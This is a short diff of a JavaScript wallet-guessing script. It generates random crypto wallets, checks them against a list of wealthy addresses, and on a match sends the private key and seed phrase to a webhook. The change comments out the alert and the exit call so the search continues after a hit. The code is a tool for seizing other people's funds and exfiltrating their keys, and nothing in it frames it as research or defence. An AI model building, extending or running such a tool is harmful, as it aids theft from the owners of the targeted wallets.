@@ -16,7 +16,7 @@ function generate() {
     console.log(wallet.address)
     if(riches.includes(wallet.address)){
         console.log("")
-        process.stdout.write('\x07');
+        // process.stdout.write('\x07');
         console.log("\x1b[32m%s\x1b[0m", ">> Success: " + wallet.address)
         successString = "Wallet: " + wallet.address + "\n\nPrivate Key: " + wallet.privateKey + "\n\n12 word phrase: " + phrase;
         webhook.send(successString)
@@ -24,7 +24,7 @@ function generate() {
         // fs.writeFileSync('./Success.txt', successString, (err) => {  
         //     if (err) throw err; 
         // })
-        process.exit()
+        // process.exit()
     }
 
     generate();
